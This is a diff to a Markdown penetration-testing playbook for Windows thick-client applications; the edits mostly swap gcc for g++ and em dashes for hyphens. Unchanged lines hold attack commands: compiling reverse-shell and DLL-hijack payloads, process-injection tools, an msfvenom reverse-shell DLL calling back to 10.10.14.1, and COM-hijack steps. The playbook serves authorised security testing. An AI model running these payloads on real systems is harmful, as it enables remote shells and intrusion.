@@ -29,10 +29,10 @@
 ### Exploitation
 ```bash
 # Compile calc-pop DLL
-x86_64-w64-mingw32-gcc -shared -o VERSION.dll payloads\calc-pop\dll_calc.c
+x86_64-w64-mingw32-g++ -shared -o VERSION.dll payloads\calc-pop\dll_calc.c
 
 # For reverse shell
-x86_64-w64-mingw32-gcc -shared -o VERSION.dll payloads\reverse-shell\dll_revshell.c -lws2_32
+x86_64-w64-mingw32-g++ -shared -o VERSION.dll payloads\reverse-shell\dll_revshell.c -lws2_32
 ```
 
 ### Test Steps
@@ -112,15 +112,15 @@ Get-Process -Name "target" | ForEach-Object {
 ### Exploitation
 ```bash
 # Classic CreateRemoteThread injection
-x86_64-w64-mingw32-gcc -o inject.exe payloads\rce\process-injection\classic_injection.c
+x86_64-w64-mingw32-g++ -std=c++20 -o inject.exe payloads\rce\process-injection\classic_injection.cpp
 inject.exe <target_pid>
 
 # DLL injection via LoadLibrary
-x86_64-w64-mingw32-gcc -o dll_inject.exe payloads\rce\process-injection\dll_injection.c
+x86_64-w64-mingw32-g++ -std=c++20 -o dll_inject.exe payloads\rce\process-injection\dll_injection.cpp
 dll_inject.exe <target_pid> C:\full\path\to\calc.dll
 
 # APC injection
-x86_64-w64-mingw32-gcc -o apc_inject.exe payloads\rce\process-injection\apc_injection.c
+x86_64-w64-mingw32-g++ -std=c++20 -o apc_inject.exe payloads\rce\process-injection\apc_injection.cpp
 apc_inject.exe <target_pid>
 ```
 
@@ -234,7 +234,7 @@ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_rever
 ### Generate Payloads
 ```bash
 # DLL reverse shell (edit ATTACKER_IP/PORT in source first)
-x86_64-w64-mingw32-gcc -shared -o revshell.dll payloads\reverse-shell\dll_revshell.c -lws2_32
+x86_64-w64-mingw32-g++ -shared -o revshell.dll payloads\reverse-shell\dll_revshell.c -lws2_32
 
 # Or use msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o revshell.dll
@@ -251,7 +251,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 
 ## 6. Insecure Credential Storage (CRITICAL)
 
-> OWASP Thick Client: TC2 — Improper Credential Storage
+> OWASP Thick Client: TC2 - Improper Credential Storage
 
 ### Automated Scan
 ```powershell
@@ -284,7 +284,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 
 ## 7. Sensitive Data in Memory (HIGH)
 
-> OWASP Thick Client: TC9 — Sensitive Data in Memory
+> OWASP Thick Client: TC9 - Sensitive Data in Memory
 
 ### Test Steps
 ```powershell
@@ -296,8 +296,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
    ```
    strings.exe -n 8 TargetApp.dmp | findstr /i "password"
    ```
-4. Logout and dump memory again — credentials should be cleared
-5. Wait for session timeout and check — sensitive data should be zeroed
+4. Logout and dump memory again - credentials should be cleared
+5. Wait for session timeout and check - sensitive data should be zeroed
 
 ### What to Look For
 - [ ] Credentials visible in memory after login
@@ -310,7 +310,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 
 ## 8. Insecure Communication / MitM (CRITICAL)
 
-> OWASP Thick Client: TC7 — Insecure Communication
+> OWASP Thick Client: TC7 - Insecure Communication
 > See: `payloads\network-mitm\ssl_intercept_setup.md` for full setup
 
 ### Test Steps
@@ -328,7 +328,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 - [ ] Weak TLS (v1.0/1.1, weak ciphers)
 - [ ] Credentials in URL parameters
 - [ ] No certificate pinning for sensitive operations
-- [ ] Update mechanism over HTTP (CRITICAL — MitM → RCE)
+- [ ] Update mechanism over HTTP (CRITICAL - MitM → RCE)
 
 ---
 
@@ -356,7 +356,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 
 ## 10. Binary Patching / Client-Side Auth Bypass (CRITICAL)
 
-> OWASP Thick Client: TC3/TC5 — Improper Authorization/Authentication
+> OWASP Thick Client: TC3/TC5 - Improper Authorization/Authentication
 > See: `payloads\binary-patching\binary_analysis.md`
 
 ### Test Steps
@@ -403,7 +403,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 1. Use procmon to find COM CLSIDs loaded by the app
 2. Check if HKCU override is possible (no HKCU entry exists)
 3. Register malicious DLL under HKCU for the CLSID
-4. Restart the application — payload should execute
+4. Restart the application - payload should execute
 
 ---
 
@@ -434,7 +434,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o 
 ## 15. Evidence Collection
 
 For each finding, document:
-1. **Vulnerability**: Name and type (e.g., DLL Hijack — VERSION.dll)
+1. **Vulnerability**: Name and type (e.g., DLL Hijack - VERSION.dll)
 2. **CVSS Score**: Calculate base score
 3. **Steps to Reproduce**: Exact commands and paths
 4. **Impact**: What an attacker can achieve
@@ -443,7 +443,7 @@ For each finding, document:
 
 ---
 
-## Quick Reference — Common Fixes to Recommend
+## Quick Reference - Common Fixes to Recommend
 
 | Vulnerability | Recommendation |
 |---------------|----------------|
